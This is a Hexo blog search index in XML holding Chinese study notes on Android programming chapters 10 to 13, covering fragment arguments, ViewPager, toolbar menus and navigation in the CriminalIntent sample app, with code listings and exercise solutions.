<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记四]]></title>
    <url>%2F2020%2F04%2F04%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%9B%9B%2F</url>
    <content type="text"><![CDATA[2020年4月04日·清明节，致敬英雄共悼逝者。今日继续更新学习进度。更新第13章的内容 第13章 工具栏优秀的Android应用都注重工具栏设计。工具栏可放置菜单选项、提供应用导航，还能帮助统一设计风格、塑造品牌形象 AppCompatCriminalIntent应用最低只支持API 19级，原生工具栏无法支持更老版本的系统。 不过， Google已将它移植到了AppCompat库。这样一来，老版本系统（ API 9级、 Android 2.3以上）就都能使用Lollipop上的工具栏了 使用 AppCompat 库如果想给老项目添加AppCompat库，该如何做呢？ 添加AppCompat依赖项； 使用一种AppCompat主题； 确保所有activity都是AppCompatActivity子类。 更新主题 AppCompat库自带以下三种主题： Theme.AppCompat：黑色主题 Theme.AppCompat.Light：浅色主题 Theme.AppCompat.Light.DarkActionBar：带黑色工具栏的浅色主题 应用级别的主题设置在AndroidManifest.xml文件中进行。主题也可按activity配置。打开AndroidManifest.xml文件，查看application标签的android:theme属性: 12345&lt;application ··· android:theme="@style/AppTheme" ···&lt;/application&gt; AppTheme定义在res/values/styles.xml文件中。打开这个文件，参照代码清单13-2设置应用的主题： 123456789&lt;resources&gt; &lt;!-- Base application theme. --&gt; &lt;style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar"&gt; &lt;!-- Customize your theme here. --&gt; &lt;item name="colorPrimary"&gt;@color/colorPrimary&lt;/item&gt; &lt;item name="colorPrimaryDark"&gt;@color/colorPrimaryDark&lt;/item&gt; &lt;item name="colorAccent"&gt;@color/colorAccent&lt;/item&gt; &lt;/style&gt;&lt;/resources&gt; 使用AppCompatActivity 最后一步是让activity类继承AppCompatActivity类 运行应用 工具栏菜单工具栏菜单由菜单项（又称操作项）组成，它占据着工具栏的右上方区域。菜单项的操作应用于当前屏幕，甚至整个应用 在 XML 文件中定义菜单菜单是一种类似于布局的资源。创建菜单定义文件并将其放置在res/menu目录下， Android会自动生成相应的资源ID。随后，在代码中实例化菜单时，就可以直接使用 在项目工具窗口中，右键单击res目录，选择New → Android resource file菜单项。在弹出的窗口界面， 选择Menu资源类型，并命名资源文件为fragment_crime_list，点击OK按钮确认 这里，菜单定义文件遵循了与布局文件一样的命名原则。这个文件和CrimeListFragment的布局文件同名，但分别位于不同的目录。修改内容如下： 12345678&lt;menu xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto"&gt; &lt;item android:id="@+id/new_crime" android:icon="@android:drawable/ic_menu_add" android:title="@string/new_crime" app:showAsAction="ifRoom|withText"/&gt;&lt;/menu&gt; showAsAction属性用于指定菜单项是显示在工具栏上，还是隐藏于溢出菜单（ overflow menu）。该属性当前设置为ifRoom和withText的组合值。因此，只要空间足够，菜单项图标及其文字描述都会显示在工具栏上。如果空间仅够显示菜单项图标，文字描述就不会显示。如果空间大小不够显示任何项，菜单项就会隐藏到溢出菜单中。如果溢出菜单包含其他项，它们就会以三个点表示（位于工具栏最右端）： 属性showAsAction还有另外两个可选值： always和never。不推荐使用always，应尽量使用ifRoom属性值，让操作系统决定如何显示菜单项。对于那些很少用到的菜单项， never属性值是个不错的选择。总之，为了避免用户界面混乱，工具栏上只应放置常用菜单项。 app命名空间 注意，不同于常见的android命名空间声明， fragment_crime_list.xml文件使用xmlns标签定义了全新的app命名空间。指定showAsAction属性时，就用了这个新定义的命名空间。 出于兼容性考虑， AppCompat库需要使用app命名空间。操作栏API随Android 3.0引入。为了支持各种旧系统版本设备，早期创建的AppCompat库捆绑了兼容版操作栏。这样一来，不管新旧，所有设备都能用上操作栏。在运行Android 2.3或更早版本系统的设备上，菜单及其相应的XML文件确实是存在的，但是android:showAsAction属性是随着操作栏的发布才添加的。 AppCompat库不希望使用原生showAsAction属性，因此，它提供了定制版showAsAction属性（ app:showAsAction）。 使用Android Asset Studio 应用使用的图标有两种： 系统图标和项目资源图标。 系统图标（ system icon）是Android操作系统内置的图标。 android:icon属性值@android:drawable/ic_menu_add就引用了系统图标。 在应用原型设计阶段，使用系统图标不会有什么问题；而在应用发布时，无论用户运行什么设备，最好能统一应用的界面风格。要知道，不同设备或操作系统版本间，系统图标的显示风格差异很大。有些设备的系统图标甚至与应用的整体风格完全不搭。 一种解决方案是创建定制图标。这需要针对不同屏幕显示密度或各种可能的设备配置，准备不同版本的图标 另一种解决方案是找到适合应用的系统图标，将它们直接复制到项目的drawable资源目录中 还有第三个、也是最容易的解决方案：使用Android Studio内置的Android Asset Studio工具。你可以用它为工具栏创建或定制图片： 在项目工具窗口中，右键单击drawable目录，选择New → Image Asset菜单项。弹出如图所示的Asset Studio窗口： 创建菜单在代码中， Activity类提供了管理菜单的回调函数。需要选项菜单时， Android会调用Activity的onCreateOptionsMenu(Menu)方法 Fragment 有 一 套 自 己 的 选 项 菜 单 回 调 函 数 以下为创建菜单和响应菜单项选择事件的两个回调方法： 12public void onCreateOptionsMenu(Menu menu, MenuInflater inflater)public boolean onOptionsItemSelected(MenuItem item) 在CrimeListFragment.java中，覆盖onCreateOptionsMenu(Menu, MenuInflater)方法，实例化fragment_crime_list.xml中定义的菜单: 12345@Overridepublic void onCreateOptionsMenu(Menu menu, MenuInflater inflater) &#123; super.onCreateOptionsMenu(menu, inflater); inflater.inflate(R.menu.fragment_crime_list, menu);&#125; 注意，我们也调用了超类的onCreateOptionsMenu(...)方法，也可以不调。调用该超类方法，任何超类定义的选项菜单功能在子类方法中都能获得应用 Fragment.onCreateOptionsMenu(Menu, MenuInflater)方法是由FragmentManager负责调用的。因此，当activity接收到操作系统的onCreateOptionsMenu(...)方法回调请求时，我们必须明确告诉FragmentManager：其管理的fragment应接收onCreateOptionsMenu(...)方法的调用指令。要通知FragmentManager，需调用以下方法： 1public void setHasOptionsMenu(boolean hasMenu) 定 义CrimeListFragment.onCreate(Bundle)方 法 ， 让 FragmentManager知 道CrimeListFragment需接收选项菜单方法回调: 12345@Overridepublic void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setHasOptionsMenu(true);&#125; 响应菜单项选择用户点击菜单中的菜单项时， fragment会收到onOptionsItemSelected(MenuItem)方法的回调请求。传入该方法的参数是一个描述用户选择的MenuItem实例 菜单通常包含多个菜单项。通过检查菜单项ID，可确定被选中的是哪个菜单项，然后作出相应的响应。这个ID实际就是在菜单定义文件中赋予菜单项的资源ID 注意， onOptionsItemSelected(MenuItem)方法返回的是布尔值。一旦完成菜单项事件处理，该方法应返回true值以表明任务已完成。另外，默认case表达式中，如果菜单项ID不存在，超类版本方法会被调用 实现层级式导航目前为止， CriminalIntent应用主要靠后退键在应用内导航。后退键导航又称为临时性导航，只能返回到上一次浏览过的用户界面；而层级式导航（ hierarchical navigation，有时又称为ancestral navigation）可在应用内逐级向上导航。有了层级式导航，用户可点击工具栏左边的向上按钮向上导航 打 开 AndroidManifest.xml ， 参 照 代 码 清 单 13-11 添 加 parentActivityName 属 性 ， 开 启CriminalIntent应用的层级式导航： 1234&lt;activity android:name=".CrimePagerActivity" android:parentActivityName=".CrimeListActivity"&gt;&lt;/activity&gt; 运行应用并创建新的crime记录。在屏幕的左上方，可看到向上按钮。点击按钮可向上一级导航至CrimeListActivity用户界面 层级式导航的工作原理 后退键导航和向上按钮导航执行同样的操作。虽然结果一样，但它们各自的后台实现机制大不相同。知道这一点很重要，因为取决于具体应用，向上导航很可能会让用户迷失在众多activity中（这里指回退栈内的众多activity） 用户点击向上按钮自CrimePagerActivity界面向上导航时，如下的intent会被创建： 1234Intent intent = new Intent(this, CrimeListActivity.class);intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);startActivity(intent);finish(); FLAG_ACTIVITY_CLEAR_TOP指示Android在回退栈中寻找指定的activity实例。如果实例存在，则弹出栈内所有其他activity，让启动的目标activity出现在栈顶（显示在屏幕上）: 可选菜单项添加一个菜单项来实现显示或隐藏CrimeListActivity工具栏的子标题（用来显示crime记录条数）。修改menu视图文件fragment_crime_list.xml： 123456789101112&lt;menu xmlns:android="http://schemas.android.com/apk/res/android"xmlns:app="http://schemas.android.com/apk/res-auto"&gt;&lt;item android:id="@+id/new_crime" android:icon="@android:drawable/ic_menu_add" android:title="@string/new_crime" app:showAsAction="ifRoom|withText"/&gt;&lt;item android:id="@+id/show_subtitle" android:title="@string/show_subtitle" app:showAsAction="ifRoom"/&gt;&lt;/menu&gt; CrimeListFragment创建新方法updateSubtitle()： 1234567private void updateSubtitle() &#123; CrimeLab crimeLab = CrimeLab.get(getActivity()); int crimeCount = crimeLab.getCrimes().size(); String subtitle = getString(R.string.subtitle_format, crimeCount); AppCompatActivity activity = (AppCompatActivity) getActivity(); activity.getSupportActionBar().setSubtitle(subtitle);&#125; getString(int resId, Object…formatArgs)方法接受字符串资源中占位符的替换值，updateSubtitle()用它生成子标题字符串。接着，托管CrimeListFragment的activity被强制类型转换为AppCompatActivity。既然CriminalIntent应用使用了AppCompat库，所有activity就都是AppCompatActivity的子类，自然也能访问工具栏。（由于兼容性问题，在AppCompat库中，工具栏在很多地方仍被称为操作栏。） 在onOptionsItemSelected(…)方法中，调用updateSubtitle()方法响应新增菜单项的单击事件： 12345678910111213@Overridepublic boolean onOptionsItemSelected(MenuItem item) &#123; switch (item.getItemId()) &#123; case R.id.new_crime: ... return true; case R.id.show_subtitle: updateSubtitle(); return true; default: return super.onOptionsItemSelected(item); &#125;&#125; 切换菜单项标题调用onOptionsItemSelected(MenuItem)方法时，传入的参数是用户点击的MenuItem。虽然可以在这个方法里更新SHOW SUBTITLE菜单项的文字，但设备旋转并重建工具栏时，子标题的变化会丢失。 比较好的解决方法是在onCreateOptionsMenu(...)方法内更新SHOW SUBTITLE菜单项，并在用户点击子标题菜单项时重建工具栏。对于用户选择菜单项或重建工具栏的场景，都可以使用这段菜单项更新代码 首先新增跟踪记录子标题状态的成员变量： 1private boolean mSubtitleVisible; 接着，用户点击SHOW SUBTITLE菜单项时，在onCreateOptionsMenu(...)方法内更新子标题，同时重建菜单项 12345678910111213141516171819202122232425@Overridepublic void onCreateOptionsMenu(Menu menu, MenuInflater inflater) &#123; super.onCreateOptionsMenu(menu, inflater); inflater.inflate(R.menu.fragment_crime_list, menu); MenuItem subtitleItem = menu.findItem(R.id.show_subtitle); if (mSubtitleVisible) &#123; subtitleItem.setTitle(R.string.hide_subtitle); &#125; else &#123; subtitleItem.setTitle(R.string.show_subtitle); &#125;&#125;@Overridepublic boolean onOptionsItemSelected(MenuItem item) &#123; switch (item.getItemId()) &#123; case R.id.new_crime: ... case R.id.show_subtitle: mSubtitleVisible = !mSubtitleVisible; getActivity().invalidateOptionsMenu(); updateSubtitle(); return true; default: return super.onOptionsItemSelected(item); &#125;&#125; 最后，根据mSubtitleVisible变量值，联动菜单项标题与子标题: 12345678910private void updateSubtitle() &#123; CrimeLab crimeLab = CrimeLab.get(getActivity()); int crimeCount = crimeLab.getCrimes().size(); String subtitle = getString(R.string.subtitle_format, crimeCount); if (!mSubtitleVisible) &#123; subtitle = null; &#125; AppCompatActivity activity = (AppCompatActivity) getActivity(); activity.getSupportActionBar().setSubtitle(subtitle);&#125; “还有个问题” 新建crime记录后，使用后退键回到CrimeListActivity界面，子标题显示的总记录数不会更新 在返回CrimeListActivity界面时，再次刷新子标题显示就能解决这个问题，即在onResume方法里再次调用updateSubtitle方法。既然onResume方法和onCreateView方法会调用updateUI方法，那就在updateUI方法里直接调用updateSubtitle方法： 1234567891011private void updateUI() &#123; CrimeLab crimeLab = CrimeLab.get(getActivity()); List&lt;Crime&gt; crimes = crimeLab.getCrimes(); if (mAdapter == null) &#123; mAdapter = new CrimeAdapter(crimes); mCrimeRecyclerView.setAdapter(mAdapter); &#125; else &#123; mAdapter.notifyDataSetChanged(); &#125; updateSubtitle();&#125; 运行CriminalIntent应用。显示子标题，然后新建crime记录并按后退键返回到CrimeListActivity界面。可以看到，工具栏显示的总记录数没问题了。 但改用向上按钮返回时，子标题显示被重置了 这是Android实现层级式导航带来的问题：导航回退到的目标activity会被完全重建。既然父activity是全新的，实例变量值以及保存的实例状态显然会彻底丢失 一种方案是覆盖向上导航的机制，而实际开发的应用绝大多数都需要多层级导航 另一种方案是在启动CrimePagerActivity时，把子标题状态作为extra信息传给它。然后，在CrimePagerActivity中覆盖getParentActivityIntent()方法，用附带了extra信息的intent重建CrimeListActivity。这需要CrimePagerActivity类知道父类工作机制的细节。 上述两种方案都不够理想，但目前没有更好的方法 修改CrimePagerActivity，新增一个字段，修改newIntent方法，并覆盖getParentActivityIntent()方法： 1234567891011121314151617181920public class CrimePagerActivity extends AppCompatActivity implements View.OnClickListener &#123; public static final String EXTRA_SUBTITLE_STATUS = "com.suqir.android.criminalintent.subtitle_status"; ··· public static Intent newIntent(Context pakageContext, UUID crimeId, boolean subtitleStatus) &#123; Intent intent = new Intent(pakageContext, CrimePagerActivity.class); intent.putExtra(EXTRA_CRIME_ID, crimeId); // 新增的 intent.putExtra(EXTRA_SUBTITLE_STATUS, subtitleStatus); return intent; &#125; ··· @Nullable @Override public Intent getParentActivityIntent() &#123; Intent parentActivityIntent = super.getParentActivityIntent(); Boolean subtitleStatus = getIntent().getBooleanExtra(EXTRA_SUBTITLE_STATUS, false); parentActivityIntent.putExtra(EXTRA_SUBTITLE_STATUS, subtitleStatus); return parentActivityIntent; &#125;&#125; 修改CrimeListActivity中启动CrimePagerActivity的内容： 12Intent intent = CrimePagerActivity.newIntent(getActivity(), mCrime.getId(), mSubtitleVisible);startActivity(intent); 修改CrimeListActivity的onCreate()方法： 123456@Overridepublic void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); mSubtitleVisible = getActivity().getIntent().getBooleanExtra(CrimePagerActivity.EXTRA_SUBTITLE_STATUS, false); setHasOptionsMenu(true);&#125; 子标题显示后，旋转设备，显示的子标题会消失 只要利用实例状态保存机制，保存mSubtitleVisible实例变量值就能解决问题： 12345678910111213141516171819public class CrimeListFragment extends Fragment &#123; private static final String SAVED_SUBTITLE_VISIBLE = "subtitle"; ... @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123; ... if (savedInstanceState != null) &#123; mSubtitleVisible = savedInstanceState.getBoolean(SAVED_SUBTITLE_VISIBLE); &#125; ··· &#125; ··· @Override public void onSaveInstanceState(Bundle outState) &#123; super.onSaveInstanceState(outState); outState.putBoolean(SAVED_SUBTITLE_VISIBLE, mSubtitleVisible); &#125;&#125; 深入学习：工具栏与操作栏工具栏和操作栏究竟有什么区别呢？ 工具栏界面更美观 工具栏比操作栏更灵活 工具栏还能支持内嵌视图和调整高度 挑战练习：删除 crime 记录CriminalIntent应用目前不支持删除现有crime记录。请为CrimeFragment添加菜单项，允许用户删除当前crime记录。用户点击删除菜单项后，记得调用CrimeFragment托管活动的finish()方法回退到前一个activity界面。 新建菜单资源，在res/menu目录下添加fragment_crime.xml文件： 123456789&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;menu xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto"&gt; &lt;item android:id="@+id/delete_crime" android:icon="@drawable/ic_menu_delete" android:title="@string/delete_crime" app:showAsAction="ifRoom|withText"/&gt;&lt;/menu&gt; 在CrimeFragment中覆盖onCreateOptionsMenu(Menu, MenuInflater)方法，实例化fragment_crime.xml中定义的菜单： 12345@Overridepublic void onCreateOptionsMenu(Menu menu, MenuInflater inflater) &#123; super.onCreateOptionsMenu(menu, inflater); inflater.inflate(R.menu.fragment_crime, menu);&#125; 定义CrimeFragment.onCreate(Bundle) 方法， 调用setHasOptionsMenu方法让FragmentManager知道CrimeFragment需接收选项菜单方法回调: 123456@Overridepublic void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); ··· setHasOptionsMenu(true);&#125; 在CrimeLab.java中，新增一个removeCrime()方法： 123public void removeCrime(Crime crime)&#123; mCrimes.remove(crime);&#125; 在CrimeFragment.java中，实现onOptionsItemSelected(MenuItem)方法，以响应菜单项的选择事件，通过检查菜单项ID判断选的是哪个菜单项: 1234567891011@Overridepublic boolean onOptionsItemSelected(MenuItem item) &#123; switch (item.getItemId()) &#123; case R.id.delete_crime: CrimeLab.get(getActivity()).removeCrime(mCrime); getActivity().finish(); return true; default: return super.onOptionsItemSelected(item); &#125;&#125; 运行效果： 挑战练习：复数字符串资源只有一条crime记录的时候，显示总记录数的子标题会显示： 1 crimes。单词crime仍用了复数形式。请改正这个粗心的语法错误。 实现思路上，你可以在代码中准备不同的字符串资源并分情况使用，但这会给应用本地化制造麻烦。比较好的做法是使用复数字符串资源（又称为量化字符串）。 首先，在strings.xml文件中定义复数字符串资源。 1234&lt;plurals name="subtitle_plural"&gt; &lt;item quantity="one"&gt;%1$d crime&lt;/item&gt; &lt;item quantity="other"&gt;%1$d crimes&lt;/item&gt;&lt;/plurals&gt; 然后，使用getQuantityString方法正确处理单复数问题。 12int crimeSize = crimeLab.getCrimes().size();String subtitle = getResources().getQuantityString(R.plurals.subtitle_plural, crimeSize, crimeSize); 挑战练习：用于 RecyclerView 的空视图当前， CriminalIntent应用启动后，会显示一个空白列表。从用户体验上来讲，即使crime列表是空的，也应展示提示或解释类信息。 请设置空视图并展示类似“没有crime记录可以显示”的信息。再添加一个按钮，方便用户直接创建新的crime记录。 判断crime列表是否包含数据，然后使用任何类都有的setVisibility方法控制占位视图的显示。 修改fragment_crime_list.xml 123456789101112131415161718192021222324252627282930313233343536&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;android.support.v7.widget.RecyclerView android:id="@+id/crime_recycler_view" android:layout_width="match_parent" android:layout_height="match_parent" tools:layout_editor_absoluteX="0dp" tools:layout_editor_absoluteY="0dp"&gt; &lt;/android.support.v7.widget.RecyclerView&gt; &lt;TextView android:id="@+id/tv_no_crime" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="@string/no_crime" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" /&gt; &lt;Button android:id="@+id/btn_add_crime" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="16dp" android:text="@string/new_crime" app:layout_constraintEnd_toEndOf="@+id/tv_no_crime" app:layout_constraintStart_toStartOf="@+id/tv_no_crime" app:layout_constraintTop_toBottomOf="@+id/tv_no_crime" /&gt;&lt;/android.support.constraint.ConstraintLayout&gt; string.xml里新增 1&lt;string name="no_crime" translatable="true"&gt;没有Crime记录可以显示&lt;/string&gt; 修改CrimeListFragment.java 增加两个变量 12private TextView mNoCrimeTv;private Button mNoCrimeBtn; 修改onCreateView方法为上面两个变量绑定id组件 1234567891011NoCrimeTv = v.findViewById(R.id.tv_no_crime);mNoCrimeBtn = v.findViewById(R.id.btn_add_crime);mNoCrimeBtn.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Crime crime = new Crime(); CrimeLab.get(getActivity()).addCrime(crime); Intent intent = CrimePagerActivity.newIntent(getActivity(), crime.getId(), mSubtitleVisible); startActivity(intent); &#125;&#125;); 修改CrimeListFragment.java的updateUI方法，判断crime为空时textview和button控件可见 12345678910private void updateUI() &#123; ··· if (crimes.size() != 0)&#123; mNoCrimeTv.setVisibility(View.GONE); mNoCrimeBtn.setVisibility(View.GONE); &#125; else &#123; mNoCrimeTv.setVisibility(View.VISIBLE); mNoCrimeBtn.setVisibility(View.VISIBLE); &#125;&#125; 运行效果 Crime记录为空 添加Crime记录后]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记三]]></title>
    <url>%2F2020%2F03%2F30%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89%2F</url>
    <content type="text"><![CDATA[这篇文章将继续学习《Android编程权威指南》的第10-12章 第十章 使用fragment argument从 fragment 中启动 activity从 fragment 中 启 动 activity 类 似 于 从 activity 中 启 动 activity 。 我 们 调 用 Fragment.startActivity(Intent)方法，由它在后台再调用对应的Activity方法 12Intent intent = new Intent(getActivity(), CrimeActivity.class);startActivity(intent); 由于不知道该显示哪个Crime对象，因此CrimeFragment没有显示出具体的Crime信息 附加 extra 信息启动CrimeActivity时，传递附加到Intent extra上的crime ID， CrimeFragment就能知道该显示哪个Crime。这需要在CrimeActivity中新增newIntent方法.创建了显式intent后，调用putExtra(...)方法，传入匹配crimeId的字符串键与键值 123456789public class CrimeActivity extends SingleFragmentActivity &#123; public static final String EXTRA_CRIME_ID = "com.bignerdranch.android.criminalintent.crime_id"; public static Intent newIntent(Context packageContext, UUID crimeId) &#123; Intent intent = new Intent(packageContext, CrimeActivity.class); intent.putExtra(EXTRA_CRIME_ID, crimeId); return intent; &#125; ...&#125; 更新CrimeHolder，使用newIntent方法 12345678private class CrimeHolder extends RecyclerView.ViewHolder implements View.OnClickListener &#123; ... @Override public void onClick(View view) &#123; Intent intent = CrimeActivity.newIntent(getActivity(), mCrime.getId()); startActivity(intent); &#125;&#125; 获取 extra 信息crime ID现已安全存储到CrimeActivity的intent中。然而，要获取和使用extra信息的是CrimeFragment类 fragment有两种方式获取intent中的数据：一种简单直接，另一种复杂但比较灵活（涉及fragment argument的概念） 简单的方法CrimeFragment直接使用getActivity()方法获取CrimeActivity的intent 缺点：这种方式破坏了fragment的封装，CrimeFragment不再是可复用的构建单元，因为它现在由某个特定的activity托管着，该特定activity的Intent又定义了名为com.bignerdranch.android.criminalintent.crime_id的extra 复杂但灵活的方法(fragment argument)附加 argument 给 fragment每个fragment实例都可附带一个Bundle对象。该bundle包含键值对，我们可以像附加extra到Activity的intent中那样使用它们。一个键-值对即一个argument 要创建fragment argument，首先需创建Bundle对象。然后，使用Bundle限定类型的put方法（类似于Intent的方法），将argument添加到bundle中 1234Bundle args = new Bundle();args.putSerializable(ARG_MY_OBJECT, myObject);args.putInt(ARG_MY_INT, myInt);args.putCharSequence(ARG_MY_STRING, myString); 要附加argument bundle给fragment，需调用Fragment.setArguments(Bundle)方法。而且，还必须在fragment创建后、添加给activity前完成 为满足以上要求， Android开发人员采取的习惯做法是：添加名为newInstance()的静态方法给Fragment类。使用该方法，完成fragment实例及Bundle对象的创建，然后将argument放入bundle中，最后再附加给fragment 1234567891011public class CrimeFragment extends Fragment &#123; private static final String ARG_CRIME_ID = "crime_id"; public static CrimeFragment newInstance(UUID crimeId) &#123; Bundle args = new Bundle(); args.putSerializable(ARG_CRIME_ID, crimeId); CrimeFragment fragment = new CrimeFragment(); fragment.setArguments(args); return fragment; &#125; ...&#125; 现在， 需创建CrimeFragment时， CrimeActivity应调用CrimeFragment.newInstance(UUID)方法，并传入从它的extra中获取的UUID参数值 1234protected Fragment createFragment() &#123; UUID crimeId = (UUID) getIntent().getSerializableExtra(EXTRA_CRIME_ID); return CrimeFragment.newInstance(crimeId);&#125; 注意， activity和 fragment不需要也无法同时相互保持独立。托管activity应该知道这些细节，以便托管fragment；但fragment不一定需要知道其托管activity的细节问题，至少在需要保持fragment通用独立的时候如此 获取 argumentfragment需要获取它的argument时，会先调用Fragment类的getArguments()方法，再调用Bundle限定类型的get方法，如getSerializable(...)方法 123456@Overridepublic void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); UUID crimeId = (UUID) getArguments().getSerializable(ARG_CRIME_ID); mCrime = CrimeLab.get(getActivity()).getCrime(crimeId);&#125; 刷新显示列表CrimeListFragment启动CrimeActivity实例后， CrimeActivity被置于回退栈顶。这导致原先处于栈顶的CrimeListActivity实例被暂停并停止。用户点击后退键返回到列表项界面， CrimeActivity随即弹出栈外并被销毁。此时， CrimeListActivity立即重新启动并恢复运行： CrimeListActivity恢复运行后，操作系统会发出调用onResume()生命周期方法的指令。CrimeListActivity接到指令后，它的FragmentManager会调用当前被activity托管的fragment的onResume()方法。这里的fragment就是指CrimeListFragment 在CrimeListFragment中，覆盖onResume()方法，触发调用updateUI()方法刷新显示列表项 如果已配置好CrimeAdapter，就调用notifyDataSetChanged()方法来修改updateUI()方法 12345678910111213141516@Overridepublic void onResume() &#123; super.onResume(); updateUI();&#125;private void updateUI() &#123; CrimeLab crimeLab = CrimeLab.get(getActivity()); List&lt;Crime&gt; crimes = crimeLab.getCrimes(); if (mAdapter == null) &#123; mAdapter = new CrimeAdapter(crimes); mCrimeRecyclerView.setAdapter(mAdapter); &#125; else &#123; mAdapter.notifyDataSetChanged(); &#125;&#125; 一般来说，要保证fragment视图得到刷新，在onResume()方法内更新代码是最安全的选择 通过 fragment 获取返回结果如需从已启动的activity获取返回结果，可调用Fragment.startActivityForResult(...)方法，并覆盖Fragment.onActivityResult(...)方法。 fragment能够从activity中接收返回结果，但其自身无法持有返回结果。只有activity拥有返回结果。因此，尽管Fragment有自己的startActivityForResult(...)方法和onActivityResult(...)方法，但没有setResult(...)方法。相反，应让托管activity返回结果值 123456public class CrimeFragment extends Fragment &#123; ... public void returnResult() &#123; getActivity().setResult(Activity.RESULT_OK, null); &#125;&#125; 深入学习：为何要用 fragment argumentfragment argument的使用有点复杂。为什么不直接在CrimeFragment里创建一个实例变量呢？ 创建实例变量的方式并不可靠。这是因为，在操作系统重建fragment时（设备配置发生改变）用户暂时离开当前应用（操作系统按需回收内存），任何实例变量都将不复存在。尤其是内存不够，操作系统强制杀掉应用的情况，可以说是无人能挡。 因此，可以说， fragment argument就是为应对上述场景而生 还有另一个方法应对上述场景，那就是使用实例状态保存机制。具体来说，就是将crime ID赋 值 给 实 例 变 量 ， 然 后 在onSaveInstanceState(Bundle)方 法 中 保 存 下 来 。 要 用 时 ， 从onCreate(Bundle)方法中的Bundle中取回。然而，这种解决方案的维护成本高。举例来说，如果你在若干年后要修改fragment代码以添加其他argument，很可能会忘记在onSaveInstanceState(Bundle)方法里保存新增的argument 挑战练习：实现高效的 RecyclerView 刷新Adapter的notifyDataSetChanged方法会通知RecyclerView刷新全部的可见列表项。 在CriminalIntent应用里，这个方法不够高效。这是因为，返回CrimeListFragment时，最多只有一个Crime实例会发生变化。 只需要刷新列表项中的单个crime项的话，应该使用RecyclerView.Adapter的notifyItemChanged(int)方法。修改代码调用这个方法很简单，但如何定位并刷新具体位置的列表项呢？这是一个挑战！ 在CrimeListFragment里面定义一个全局变量 1private int itemPosition; 修改CrimeListFragment里的onClick方法 123456@Overridepublic void onClick(View v) &#123; itemPosition = getAdapterPosition();// 获取当前position Intent intent = CrimeActivity.newIntent(getActivity(), mCrime.getId()); startActivity(intent);&#125; 修改updateUI方法 1234567891011121314private void updateUI() &#123; CrimeLab crimeLab = CrimeLab.get(getActivity()); List&lt;Crime&gt; crimes = crimeLab.getCrimes(); if (mAdapter == null) &#123; mAdapter = new CrimeAdapter(crimes); mCrimeRecyclerView.setAdapter(mAdapter); &#125; else &#123; // 一次刷新所有列表项 // mAdapter.notifyDataSetChanged(); // 只刷新某一项 mAdapter.notifyItemChanged(itemPosition); &#125;&#125; 挑战练习：优化 CrimeLab 的表现CrimeLab的getCrime(UUID)方法没毛病，但匹配要找的crime ID这个过程还可以再优化。请优化匹配逻辑，不过重构代码时，不要搞坏了CriminalIntent应用 这里可使用LinkedHashMap ，然后用UUID作为key来存储数据 123456789101112131415161718192021222324252627282930public class CrimeLab &#123; private static CrimeLab sCrimeLab; private Map&lt;UUID, Crime&gt; mCrimes; public static CrimeLab get(Context context) &#123; if (sCrimeLab == null) &#123; sCrimeLab = new CrimeLab(context); &#125; return sCrimeLab; &#125; private CrimeLab(Context context) &#123; mCrimes = new LinkedHashMap&lt;&gt;(); for (int i = 0; i &lt; 100; i++) &#123; Crime crime = new Crime(); crime.setTitle("Crime #" + i); crime.setSolved(i % 2 == 0); mCrimes.put(crime.getId(), crime); &#125; &#125; public List&lt;Crime&gt; getCrimes() &#123; return new ArrayList&lt;&gt;(mCrimes.values()); &#125; public Crime getCrime(UUID id) &#123; return mCrimes.get(id); &#125;&#125; 第十一章 使用ViewPagerViewPager在某种程度上类似于RecyclerView。 RecyclerView需借助于Adapter提供视图。同样， ViewPager需要PagerAdapter的支持 Google提供了PagerAdapter的子类FragmentStatePagerAdapter，它能协助处理许多细节问题 FragmentStatePagerAdapter化繁为简，提供了两个有用的方法： getCount()和getItem(int)。调用getItem(int)方法，获取并显示crime数组中指定位置的Crime时，它会返回配置过的CrimeFragment来显示指定的Crime FragmentStatePagerAdapter 与 FragmentPagerAdapterFragmentPagerAdapter是另外一种可用的PagerAdapter，其用法与FragmentStatePagerAdapter基本一致。唯一的区别在于，卸载不再需要的fragment时， 各自采用的处理方法有所不同 FragmentStatePagerAdapter会销毁不需要的fragment。事务提交后， activity的FragmentManager中的fragment会被彻底移除。 FragmentStatePagerAdapter类名中的“state”表明：在销毁fragment时，可在onSaveInstanceState(Bundle)方法中保存fragment的Bundle信息。用户切换回来时，保存的实例状态可用来生成新的fragment 相比之下， FragmentPagerAdapter有不同的做法。对于不再需要的fragment， FragmentPagerAdapter会选择调用事务的detach(Fragment)方法来处理它，而非remove(Fragment)方法。也就是说， 